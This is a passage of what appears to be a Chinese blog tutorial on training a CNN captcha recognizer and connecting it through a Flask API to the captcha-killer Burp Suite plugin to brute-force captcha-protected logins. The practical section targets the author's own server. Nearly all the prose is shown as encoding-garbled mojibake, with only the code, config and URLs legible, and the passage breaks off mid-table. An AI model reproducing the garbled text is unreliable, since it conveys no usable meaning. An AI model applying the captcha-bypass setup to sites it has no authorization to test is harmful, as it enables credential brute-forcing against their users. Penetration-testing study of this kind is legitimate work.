<p>é¡¹ç›®ä½¿ç”¨pythonè¯­è¨€ç¼–å†™ï¼Œæ‰€ä»¥éœ€è¦æ­å»ºpythonç¯å¢ƒï¼Œæ¨èä¸‹è½½python36ç‰ˆæœ¬ã€‚git clone é¡¹ç›®ä¸‹æ¥ä¹‹åï¼Œå¯¹requirements.txtæ–‡ä»¶ä¸­çš„ç¬¬ä¸‰æ–¹åº“ç‰ˆæœ¬è¿›è¡Œä¸€ä¸ªä¿®æ”¹ã€‚tensorflowçš„ç‰ˆæœ¬æ”¹ä¸º1.15.3ã€‚å¦‚æœä½ ä¹Ÿæƒ³å’Œæˆ‘ä¸€æ ·ä½¿ç”¨æ˜¾å¡æ¥è·‘ç¨‹åºï¼Œå°±æ”¹æˆtensorflow-gpu==1.15.3ã€‚<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/0%40PNXSO4JL21W%7D~XU508D53.png" alt=""></p>
<blockquote>
<p>æ³¨æ„ï¼špipæœ€å¥½è¿›è¡Œæ¢æºï¼Œä¸ç„¶ä¸‹è½½è¿™äº›åº“çš„é€Ÿåº¦å¯èƒ½è®©ä½ æ€€ç–‘äººç”Ÿ~è¿™é‡Œæ¨èæ¢æºæˆè±†ç“£æº</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pipæ¢æºæ–¹æ³•ï¼š</span><br><span class="line"></span><br><span class="line">æ‰¾åˆ°pythonçš„å®‰è£…è·¯å¾„ä¸‹çš„site-packages\pip\_internal\models\index.pyæ–‡ä»¶</span><br><span class="line">PyPI &#x3D; Index(&#39;https:&#x2F;&#x2F;pypi.python.org&#x2F;&#39;)</span><br><span class="line">ä¿®æ”¹æˆhttps:&#x2F;&#x2F;pypi.python.org&#x2F; ä¸º https:&#x2F;&#x2F;pypi.douban.com&#x2F;simple</span><br></pre></td></tr></table></figure>
<p>æ¢æºä¹‹åï¼Œæ•²pip install -r requirements.txtå‘½ä»¤è¿›è¡Œä¸‹è½½æ–‡æœ¬é‡Œçš„ç¬¬ä¸‰æ–¹åº“</p>
<h3 id="é¡¹ç›®ä½¿ç”¨"><a class="header-anchor" href="#é¡¹ç›®ä½¿ç”¨">Â¶</a>é¡¹ç›®ä½¿ç”¨</h3>
<p>ç¡®è®¤å®‰è£…å¥½pythonçš„ç¬¬ä¸‰æ–¹åº“ä¹‹åï¼Œå°±å¯ä»¥å¼€å§‹æ¨¡å‹çš„è®­ç»ƒäº†~<br>
ä¸€å¼€å§‹ï¼Œåœ¨æ²¡æœ‰å›¾ç‰‡éªŒè¯ç çš„æ•°æ®é›†çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©gen_sample_by_captcha.pyæ–‡ä»¶ç”ŸæˆéªŒè¯ç çš„æ•°æ®é›†</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å»é…ç½®æ–‡ä»¶è¿›è¡Œä¸€ä¸ªä¿®æ”¹ï¼ˆå½“ç„¶ä¸ä¿®æ”¹ä¹Ÿå¯ä»¥ï¼‰æ‰“å¼€conf/captcha_config.jsonæ–‡ä»¶ï¼Œä¿®æ”¹æˆåƒæˆ‘è¿™æ ·<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/_4_CH%7BQQ4867P%25%7D80DQ2%28TE.png" alt=""><br>
ä¸€å¼€å§‹æˆ‘ä»¬å°±å…ˆè®­ç»ƒçº¯æ•°å­—çš„éªŒè¯ç æ¨¡å‹ï¼Œè®¾ç½®çš„è¿‡äºå¤æ‚ï¼Œæ¨¡å‹çš„è®­ç»ƒæ—¶é—´ä¹Ÿä¼šè¶Šé•¿ï¼Œæƒ³è¦æœ‰è‰¯å¥½çš„è¯†åˆ«ç‡ï¼Œå°±ä¸å¾—ä¸è¿›è¡Œå¤šæ¬¡è®­ç»ƒã€‚<br>
è¿è¡Œgen_sample_by_captcha.pyæ–‡ä»¶ï¼Œç”Ÿæˆ10000å¼ å›¾ç‰‡æ–‡ä»¶<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/R2%29%24R8A08%40%608%40%5B%25ZQL3N%25%25K.png" alt=""><br>
åœ¨sample/originç›®å½•ä¸‹å¯ä»¥çœ‹è§ç”Ÿæˆçš„å›¾ç‰‡<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/H%40PA%40K7FZO3%5D%40%25R%60Q1BIX3D.png" alt=""><br>
ç„¶åsample/originç›®å½•ä¸‹æ–°å»ºä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œtrainå’Œtestï¼ˆä¸ç”¨åˆ›å»ºä¹Ÿè¡Œï¼Œä»£ç é‡Œä¼šè‡ªåŠ¨åˆ¤æ–­æœ‰æ— ï¼Œè¿›è¡Œåˆ›å»ºï¼‰<br>
æ¥ä¸‹æ¥éœ€è¦ä½¿ç”¨verify_and_split_data.pyæ–‡ä»¶ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ä»–çš„é…ç½®æ–‡ä»¶/conf/sample_config.json</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;origin_image_dir&quot;: &quot;sample&#x2F;origin&#x2F;&quot;,  # åŸå§‹æ–‡ä»¶</span><br><span class="line">  &quot;new_image_dir&quot;: &quot;sample&#x2F;new_train&#x2F;&quot;,  # æ–°çš„è®­ç»ƒæ ·æœ¬</span><br><span class="line">  &quot;train_image_dir&quot;: &quot;sample&#x2F;train&#x2F;&quot;,    # è®­ç»ƒé›†</span><br><span class="line">  &quot;test_image_dir&quot;: &quot;sample&#x2F;test&#x2F;&quot;,      # æµ‹è¯•é›†</span><br><span class="line">  &quot;api_image_dir&quot;: &quot;sample&#x2F;api&#x2F;&quot;,        # apiæ¥æ”¶çš„å›¾ç‰‡å‚¨å­˜è·¯å¾„</span><br><span class="line">  &quot;online_image_dir&quot;: &quot;sample&#x2F;online&#x2F;&quot;,  # ä»éªŒè¯ç urlè·å–çš„å›¾ç‰‡çš„å‚¨å­˜è·¯å¾„</span><br><span class="line">  &quot;local_image_dir&quot;: &quot;sample&#x2F;local&#x2F;&quot;,    # æœ¬åœ°ä¿å­˜å›¾ç‰‡çš„è·¯å¾„</span><br><span class="line">  &quot;model_save_dir&quot;: &quot;model&#x2F;&quot;,            # ä»éªŒè¯ç urlè·å–çš„å›¾ç‰‡çš„å‚¨å­˜è·¯å¾„</span><br><span class="line">  &quot;image_width&quot;: 100,                    # å›¾ç‰‡å®½åº¦</span><br><span class="line">  &quot;image_height&quot;: 60,                    # å›¾ç‰‡é«˜åº¦</span><br><span class="line">  &quot;max_captcha&quot;: 4,                      # éªŒè¯ç å­—ç¬¦ä¸ªæ•°</span><br><span class="line">  &quot;image_suffix&quot;: &quot;png&quot;,                 # å›¾ç‰‡æ–‡ä»¶åç¼€</span><br><span class="line">  &quot;char_set&quot;: &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;,  # éªŒè¯ç è¯†åˆ«ç»“æœç±»åˆ«</span><br><span class="line">  &quot;use_labels_json_file&quot;: false,                       # æ˜¯å¦å¼€å¯è¯»å–&#96;labels.json&#96;å†…å®¹</span><br><span class="line">  &quot;remote_url&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:6100&#x2F;captcha&#x2F;&quot;,      # éªŒè¯ç è¿œç¨‹è·å–åœ°å€</span><br><span class="line">  &quot;cycle_stop&quot;: 3000,                                  # å¯åŠ¨ä»»åŠ¡åçš„è®­ç»ƒæŒ‡å®šæ¬¡æ•°ååœæ­¢</span><br><span class="line">  &quot;acc_stop&quot;: 0.99,                                    # è®­ç»ƒåˆ°æŒ‡å®šå‡†ç¡®ç‡ååœæ­¢</span><br><span class="line">  &quot;cycle_save&quot;: 500,                                   # è®­ç»ƒæŒ‡å®šæ¬¡æ•°åå®šæ—¶ä¿å­˜æ¨¡å‹</span><br><span class="line">  &quot;enable_gpu&quot;: 0,                                     # æ˜¯å¦å¼€å¯GUPè®­ç»ƒ</span><br><span class="line">  &quot;train_batch_size&quot;: 128,                             # è®­ç»ƒæ—¶æ¯æ¬¡ä½¿ç”¨çš„å›¾ç‰‡å¼ æ•°ï¼Œå¦‚æœCPUæˆ–è€…GPUå†…å­˜å¤ªå°å¯ä»¥å‡å°‘è¿™ä¸ªå‚æ•°</span><br><span class="line">  &quot;test_batch_size&quot;: 100                               # æ¯æ‰¹æ¬¡æµ‹è¯•æ—¶éªŒè¯çš„å›¾ç‰‡å¼ æ•°ï¼Œä¸è¦è¶…è¿‡éªŒè¯ç é›†çš„æ€»æ•°</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬è¿›è¡Œä¸€ä¸ªç®€å•ä¿®æ”¹ï¼Œæ‰“ç éƒ¨åˆ†æ˜¯æˆ‘è‡ªå®šä¹‰çš„åœ°å€ï¼Œæš‚æ—¶å¯ä»¥ä¿æŒåŸè·¯å¾„ä¸å˜<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/HXWUB_WGG2%7DFJPI37AZCS%5BA.png" alt=""><br>
ç„¶åè¿è¡Œverify_and_split_data.pyæ–‡ä»¶ï¼Œç¨‹åºä¼šåŒæ—¶æ ¡éªŒå’Œåˆ†å‰²originå’Œnew_trainä¸¤ä¸ªç›®å½•ä¸­çš„å›¾ç‰‡,æŒ‰ç…§æ¯”ä¾‹åˆ†åˆ°testå’Œtrainæ–‡ä»¶å¤¹ä¸­ï¼›<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/~R77DWZRZXH4GH%252W%5BATK9O.png" alt=""><br>
åç»­æœ‰äº†æ›´å¤šçš„æ ·æœ¬ï¼Œå¯ä»¥æŠŠæ ·æœ¬æ”¾åœ¨new_trainç›®å½•ä¸­å†æ¬¡æ‰§è¡Œverify_and_split_dataã€‚<br>
ç¨‹åºä¼šæŠŠæ— æ•ˆçš„æ–‡ä»¶ç•™åœ¨åŸæ–‡ä»¶å¤¹ã€‚<br>
æ­¤å¤–ï¼Œå½“ä½ æœ‰æ–°çš„æ ·æœ¬éœ€è¦ä¸€èµ·è®­ç»ƒï¼Œå¯ä»¥æ”¾åœ¨sample/newç›®å½•ä¸‹ï¼Œå†æ¬¡è¿è¡Œverify_and_split_data.pyå³å¯ã€‚<br>
éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæ–°çš„æ ·æœ¬ä¸­æœ‰æ–°å¢çš„æ ‡ç­¾ï¼Œä½ éœ€è¦æŠŠæ–°çš„æ ‡ç­¾å¢åŠ åˆ°char_seté…ç½®ä¸­æˆ–è€…labels.jsonæ–‡ä»¶ä¸­</p>
<p>è®­ç»ƒé›†å’Œæµ‹è¯•é›†éƒ½æœ‰äº†ä¹‹åï¼Œæ¥ä¸‹æ¥å°±æ˜¯è®­ç»ƒæ¨¡å‹ï¼Œè¿è¡Œtrain_model.pyæ–‡ä»¶è¿›è¡Œæ¨¡å‹è®­ç»ƒ<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%409HLQA8%28J%7D%7B_1E1%7DVJEI%60%7BR.png" alt=""><br>
è®­ç»ƒæ¨¡å‹çš„é€Ÿåº¦å–å†³å–å†³äºä½ çš„ç”µè„‘ï¼Œå¯èƒ½å‡ ååˆ†é’Ÿï¼Œå¯èƒ½å‡ ä¸ªå°æ—¶æˆ–è€…å‡ åä¸ªå°æ—¶ä¸ç­‰ï¼Œå¯ä»¥é‡å¤å¤šæ¬¡è¿è¡Œæ–‡ä»¶è¿›è¡Œè®­ç»ƒæé«˜å‡†ç¡®ç‡<br>
è¿™é‡Œè´´å¼ ä¸‹é¢è®²å®æˆ˜ä¸­ä½¿ç”¨çš„æ¨¡å‹çš„è®­ç»ƒå›¾ç‰‡ï¼Œä½¿ç”¨äº†2000å¼ éªŒè¯ç å›¾ç‰‡ï¼Œæˆ‘çš„ç”µè„‘è·‘äº†ä¸€åˆ†é’Ÿå·¦å³çš„æ—¶é—´å§<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%28LUUW%28M9X%7DFU9G%7DGJL5TQPR.png" alt=""><br>
æ¥ä¸‹æ¥æˆ‘ä»¬è¿è¡Œtest_batch.pyæ–‡ä»¶è¿›è¡Œä¸€ä¸ªéªŒè¯<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%5D4KSDH%60KUWFJO%7DKUY61P~ZY.png" alt=""><br>
æ¥ç€å¯åŠ¨æ¥å£çš„apiï¼Œè¿è¡Œwebserver_recognize_api.pyï¼Œæ­¤æ—¶å ä¸€ä¸ªä¼šè¯çª—å£<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/WHR9A%25W0%5BL878MEGG~%7DB%40%605.png" alt=""><br>
å†æ¬¡è¿è¡Œï¼Œé»˜è®¤æ˜¯6000ç«¯å£ï¼Œè¿™é‡Œæˆ‘æ”¹æˆäº†7000ç«¯å£<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/GE~ZGQURWU%282PL%7D%7BE7H1%28W0.png" alt=""><br>
å¯åŠ¨recognize_local.pyæ–‡ä»¶å‘é€è¯·æ±‚è¿›è¡Œä¸€ä¸ªéªŒè¯<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/Z7%7B_4%29F8%60F%5D4%60DUT%7DP4TV_I.png" alt=""><br>
æ¥å£è¿”å›æ•°æ®å°±okå•¦~</p>
<h2 id="captcha-killerçš„å®‰è£…"><a class="header-anchor" href="#captcha-killerçš„å®‰è£…">Â¶</a>captcha-killerçš„å®‰è£…</h2>
<p>é¡¹ç›®åœ°å€:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;c0ny1&#x2F;captcha-killer&#x2F;releases</span><br></pre></td></tr></table></figure>
<p>ä¸‹è½½å¥½jaråŒ…ä¹‹åï¼Œæ‰“å¼€burpsuiteè¿›è¡Œå®‰è£…<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/BGR%24~525EAJZ%7D%257%60QJ%7BBFLP.png" alt=""></p>
<h1>å®æˆ˜</h1>
<p>é¦–å…ˆä½¿ç”¨pythonçˆ¬è™«å¯¹ç½‘ç«™çš„éªŒè¯ç è¿›è¡Œä¸€ä¸ªçˆ¬å–<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/1IOO51MC64~YFHOLE%7D_%5B%24LN.png" alt=""><br>
ç„¶åæŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤è¿›è¡Œä¸€ä¸ªæ¨¡å‹è®­ç»ƒ<br>
è¿™æ˜¯æˆ‘æœ¬äººæœåŠ¡å™¨ä¸Šæ­å»ºçš„ç½‘ç«™<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/D%7B5Y%29EA%7DE%25W0XE%5B1OL7MRVP.png" alt=""><br>
é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æŠ“å–ç”ŸæˆéªŒè¯ç æ–‡ä»¶çš„åŒ…ï¼Œç„¶åå³é”®å‘é€åˆ°captchaé¢æ¿ä¸Š<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20201117154445.png" alt=""><br>
ç„¶ååœ¨killeré¢æ¿ä¸Šï¼Œç‚¹å‡»ä¸€ä¸‹è·å–ï¼Œå°±å¯ä»¥å‡ºç°éªŒè¯ç å›¾ç‰‡å’Œä¿¡æ¯äº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/2~EOM%5B%25%5BN%7BFNI%40L%28ZM~2DZU.png" alt=""><br>
ç„¶åæˆ‘ä»¬éœ€è¦åœ¨webserver_recognize_api.pyæ–‡ä»¶æ–°å¢åŠ ä¸€ä¸ªæ–¹æ³•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/base64&#x27;, methods=[&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up_imageBase64</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.form[<span class="string">&#x27;image_file&#x27;</span>]:</span><br><span class="line"></span><br><span class="line">        timec = str(time.time()).replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        file = request.form[<span class="string">&#x27;image_file&#x27;</span>]</span><br><span class="line">        img = base64.b64decode(file)</span><br><span class="line">        img = BytesIO(img)</span><br><span class="line">        img = Image.open(img, mode=<span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="comment"># username = request.form.get(&quot;name&quot;)</span></span><br><span class="line">        print(<span class="string">&quot;æ¥æ”¶å›¾ç‰‡å°ºå¯¸: &#123;&#125;&quot;</span>.format(img.size))</span><br><span class="line">        img_size = img.resize((image_width, image_height), Image.ANTIALIAS)</span><br><span class="line">        print(<span class="string">&quot;æ¥æ”¶å›¾ç‰‡å°ºå¯¸2ï¼š&#123;&#125;&quot;</span>.format(img_size))</span><br><span class="line">        s = time.time()</span><br><span class="line">        value = R.rec_image(img_size)</span><br><span class="line">        e = time.time()</span><br><span class="line">        print(<span class="string">&quot;è¯†åˆ«ç»“æœ: &#123;&#125;&quot;</span>.format(value))</span><br><span class="line">        <span class="comment"># ä¿å­˜å›¾ç‰‡</span></span><br><span class="line">        print(<span class="string">&quot;ä¿å­˜å›¾ç‰‡ï¼š &#123;&#125;&#123;&#125;_&#123;&#125;.&#123;&#125;&quot;</span>.format(api_image_dir, value, timec, image_suffix))</span><br><span class="line">        file_name = <span class="string">&quot;&#123;&#125;_&#123;&#125;.&#123;&#125;&quot;</span>.format(value, timec, image_suffix)</span><br><span class="line">        file_path = os.path.join(api_image_dir + file_name)</span><br><span class="line">        img.save(file_path)</span><br><span class="line">        result = &#123;</span><br><span class="line">            <span class="string">&#x27;time&#x27;</span>: timec,   <span class="comment"># æ—¶é—´æˆ³</span></span><br><span class="line">            <span class="string">&#x27;value&#x27;</span>: value,  <span class="comment"># é¢„æµ‹çš„ç»“æœ</span></span><br><span class="line">            <span class="string">&#x27;speed_time(ms)&#x27;</span>: int((e - s) * <span class="number">1000</span>)  <span class="comment"># è¯†åˆ«è€—è´¹çš„æ—¶é—´</span></span><br><span class="line">        &#125;</span><br><span class="line">        img.close()</span><br><span class="line">        <span class="keyword">return</span> jsonify(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content = json.dumps(&#123;<span class="string">&quot;error_code&quot;</span>: <span class="string">&quot;1001&quot;</span>&#125;)</span><br><span class="line">        resp = response_headers(content)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºåŸæœ¬çš„æ–¹æ³•up_image()æ˜¯å‘é€æœ¬åœ°å›¾ç‰‡æ–‡ä»¶çš„å½¢å¼ï¼Œè€Œæˆ‘ä»¬åœ¨captcha_killeréœ€è¦é€šè¿‡å‘é€è¡¨å•è¯·æ±‚æ¥è¿›è¡Œæ¥æ”¶<br>
æ¥ç€å†å‘é€ä¸€ä¸ªrequestsè¯·æ±‚ï¼Œè¿›è¡ŒæŠ“åŒ…åå‘é€åˆ°interfaceé¢æ¿ä¸Š<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/QQ%E6%88%AA%E5%9B%BE20201117154703.png" alt=""><br>
ç„¶åæˆ‘ä»¬æŠŠå›¾ç‰‡å†…å®¹çš„ä½ç½®ç”¨æ ‡ç­¾æ¥ä»£æ›¿ã€‚<br>
æ¯”å¦‚è¯¥ä¾‹å­ä½¿ç”¨çš„æ¥å£æ˜¯postæäº¤imageå‚æ•°ï¼Œå‚æ•°çš„å€¼ä¸ºå›¾ç‰‡äºŒè¿›åˆ¶æ•°æ®çš„base64ç¼–ç åçš„urlç¼–ç ã€‚é‚£ä¹ˆRequst template(è¯·æ±‚æ¨¡ç‰ˆ)é¢æ¿åº”è¯¥å¡«å†™å¦‚ä¸‹ï¼š<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/WI%40%604SZ%29%5D4CUK%256MCFK042G.png" alt=""><br>
æ¥å£æ¨¡æ¿è®¾ç½®ï¼š</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;</td>
<td>ä»£è¡¨éªŒè¯ç å›¾ç‰‡åŸäºŒè¿›åˆ¶å†…å®¹</td>
</tr>
<tr>
<td>2</td>
<td>&lt;@URLENCODE&gt;<a href="mailto:/@URLENCODE">/@URLENCODE</a></td>
<td>å¯¹æ ‡ç­¾å†…çš„å†…å®¹è¿›è¡Œurlç¼–ç </td>
</tr>
<tr>
<td>3</td>
<td>&lt;@BASE64&gt;<a href="mailto:/@BASE64">/@BASE64</a></td>
<td>å¯¹æ ‡ç­¾å†…çš„å†…å®¹è¿›è¡Œbase64ç¼–ç </td>
</tr>
</tbody>
</table>
<p>ç„¶åç‚¹å‡»è¯†åˆ«ï¼Œå³å¯è·å–åˆ°æ¥å£è¿”å›çš„æ•°æ®åŒ…<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/E%7BZN79%25Z56%7B5W5%7D%7B%28CQAG~I.png" alt=""><br>
è¿™é‡Œçš„åŒ¹é…æ–¹å¼è§„åˆ™ï¼š</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>è§„åˆ™ç±»å‹</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Repose  data</td>
<td>è¿™ç§è§„åˆ™ç”¨äºåŒ¹é…æ¥å£è¿”å›åŒ…å†…å®¹ç›´æ¥æ˜¯è¯†åˆ«ç»“æœ</td>
</tr>
<tr>
<td>2</td>
<td>Regular  expression</td>
